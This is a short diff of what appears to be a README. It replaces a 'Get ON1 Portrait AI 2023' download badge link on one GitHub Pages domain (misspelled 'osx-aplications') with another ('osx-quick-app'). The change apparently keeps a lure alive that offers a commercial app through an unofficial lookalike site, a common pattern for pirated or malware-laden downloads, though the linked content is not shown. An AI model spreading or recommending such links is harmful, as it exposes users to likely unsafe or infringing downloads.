@@ -5,7 +5,7 @@
 <br>
 
 <p align="center">
-  <a href="https://osx-aplications.github.io/.github/on1">
+  <a href="https://osx-quick-app.github.io/.github/on1">
     <img src="https://img.shields.io/badge/Get%20ON1%20Portrait%20AI%202023-green?style=for-the-badge&logo=apple&logoColor=white" alt="Get ON1 Portrait AI 2023">
   </a>
 </p>
